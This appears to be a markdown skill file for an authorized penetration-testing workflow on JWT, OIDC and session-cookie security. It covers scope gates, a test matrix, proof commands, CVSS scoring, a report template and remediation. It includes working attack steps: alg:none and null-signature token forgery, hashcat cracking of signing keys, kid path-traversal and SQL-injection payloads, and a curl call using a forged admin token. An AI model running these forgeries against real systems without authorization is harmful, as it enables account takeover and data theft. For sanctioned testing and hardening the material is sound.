---
name: authentication-jwt
description: 'JWT, OIDC token, and cookie/session testing covering alg confusion, weak keys, claim tampering, kid injection, and session fixation. Triggers: JWT, token, "cookie ပြောင်း", "session ခိုး", "jwt ဖောက်".'
category: vulnerabilities
track: 02-vuln-class
tags: [jwt, session, cookie, auth, oidc]
severity_ceiling: critical
requires: [two-test-accounts, baseline-http-capture]
tools: [python3, curl, hashcat]
cwe: CWE-347
owasp: [A07:2025, API2:2023]
version: 1.0.0
author: kkuser
source: original
---

> Shared rules apply: `../_shared/evidence-policy.md`, `../_shared/scope-gate.md`.

# JWT, Session, and Cookie Security

## 1. Preconditions

- Two accounts (A and B) and their tokens captured.
- The raw token: `header.payload.signature` for JWT; cookie attributes for sessions.
- A decoder. `jwt_tool` is **not** on PATH in this environment; it lives at
  `/opt/jwt_tool/jwt_tool.py`. Create the alias first so every command below works:

  ```bash
  alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
  ```

  Fallback with no dependency: `echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .`
- `hashcat` is **not** installed here. Either install it, or substitute `john` on your own
  tooling host; the cracking step is optional for the finding (the acceptance of a forged token
  is what matters).
- Written authorization before any brute-force of a signing key.

## 2. Gate

| Cell | Token | Expected if secure |
|---|---|---|
| Control | A's real token | 200, identity = A |
| Tamper | A's token with `"role":"admin"` and **unchanged** signature | 401 / 403 |
| Tamper + resign | same, signed with a guessed key | 401 |

**Pass (flaw):** the tampered token without a valid signature is accepted, or a trivially
re-signed token is accepted. **Fail:** signature verification rejects both.

Also gate the claims themselves:

```bash
jwt_tool "$TOKEN" -d
# look for: alg, kid, jku, x5u, cty, exp, iss, aud, sub, scope, role, tenant
```

## 3. Enumeration

- Token sources: `Authorization: Bearer`, cookies, `localStorage`, `sessionStorage`,
  URL fragment after implicit flow, JSON body of `/token`.
- Endpoints: `/.well-known/openid-configuration`, `/jwks.json`, `/keys`, `/certs`.
- Cookie attributes to record per cookie: `HttpOnly`, `Secure`, `SameSite`, `Path`,
  `Domain`, `Max-Age`, and whether the value changes on login (rotation).

Session-map checks (folded from cookie-session-audit):

| Check | Fail signal |
|---|---|
| Session ID entropy | < 64 bits, sequential, time-based |
| Rotation on login | same ID before/after auth |
| Rotation on privilege change | same ID after role switch |
| Logout invalidation | old cookie still works server-side |
| Concurrent sessions | unlimited, no revoke UI |
| Cookie scope | `Domain=.example.com` on a shared parent |
| Flags | missing `HttpOnly` / `Secure` / `SameSite` |

## 4. Test Matrix

| # | Attack | How | Pass signal |
|---|---|---|---|
| 1 | `alg:none` | set header `{"alg":"none"}`, strip signature | accepted |
| 2 | HS256 with public key as secret | sign with the RSA public key PEM | accepted |
| 3 | Weak HMAC secret | `hashcat -m 16500 jwt.txt rockyou.txt` | key found |
| 4 | `kid` path traversal | `"kid":"../../dev/null"` with empty-key HMAC | accepted |
| 5 | `kid` SQLi | `"kid":"x' UNION SELECT 'secret'--"` | accepted |
| 6 | `jku`/`x5u` to own host | point to your JWKS | accepted |
| 7 | Claim tampering | `sub`, `role`, `tenant`, `email` changed | accepted |
| 8 | `exp` missing / far future | remove `exp` | accepted |
| 9 | Audience/issuer not checked | token from another app in the same IdP | accepted |
| 10 | Cross-service reuse | A's token on service B | accepted |

## 5. Proof

```bash
# decode
jwt_tool "$TOKEN" -d

# alg:none
jwt_tool "$TOKEN" -X a

# null signature
jwt_tool "$TOKEN" -X n

# weak secret
hashcat -m 16500 jwt.txt /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
jwt_tool "$TOKEN" -C -d "$SECRET"

# claim tamper with known key
jwt_tool "$TOKEN" -T -S hs256 -p "$SECRET"

# then prove privilege: call an admin-only endpoint with the forged token
curl -s -H "Authorization: Bearer $FORGED" https://app.example.com/api/admin/users | head -c 400
```

A forged token is only a finding when an endpoint **acts** on it. Capture the admin
response and note it as a token forged via exposed/weak signing material.

## 6. Counterevidence

| Alternative explanation | How to kill it |
|---|---|
| The server ignored my token and used my session cookie | Remove the cookie, send only the token |
| The endpoint is public anyway | Call it with no auth; if 200, it is not protected |
| `alg:none` accepted by the parser but rejected downstream | The privileged call must return data |
| "Role" in the token is not used for authz | Prove with an admin-only action, not just a 200 |
| Weak key found but token has a different `kid` | Re-sign with the same header and verify acceptance |
| The 200 was a soft-fail page | Compare body hash to the no-auth baseline |

## 7. Impact

State the boundary crossed: user → admin, tenant A → tenant B, or unauthenticated →
authenticated. *"A JWT signed with the key `secret` was accepted by `/api/admin/*`,
returning 412 user records including password hashes."*

## 8. CVSS 3.1

```text
Forged admin token, unauthenticated:  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
Authenticated user → admin:           CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
Missing HttpOnly + XSS required:      do not score here — score the XSS
Session not rotated on login:         AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N = 3.7
```

## 9. Report

```markdown
# JWT signing key is guessable, allowing admin token forgery

**Severity:** Critical (CVSS 3.1: 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Affected asset:** auth.example.com  token issuer; app.example.com /api/admin/*
**Category:** CWE-347 · OWASP A07:2025
```

Include the decoded token (redacted signature), the recovered key (redact to first 2 chars
in the client-facing copy), and the admin response.

## 10. Remediation

- Pin the accepted algorithm server-side (`algorithms: ["RS256"]`); never trust `alg`.
- Reject `none`; reject tokens without `exp`, `iss`, `aud`.
- Use a 256-bit random HMAC secret or, better, asymmetric keys with rotation via `kid`
  mapped to a server-side key table — never a filesystem path.
- Verify `aud` and `iss` per service; do not accept tokens minted for another audience.
- Session cookies: `HttpOnly; Secure; SameSite=Lax` (or `Strict`), `__Host-` prefix,
  rotate on login and privilege change, invalidate server-side on logout.
- Short access-token TTL (≤15 min) with refresh rotation.

Regression test: `alg:none` token and a token with a modified `role` must both return 401.

## 11. References

- RFC 8725 — JSON Web Token Best Current Practices
- CWE-347: Improper Verification of Cryptographic Signature
- OWASP JWT Cheat Sheet · OWASP Session Management Cheat Sheet
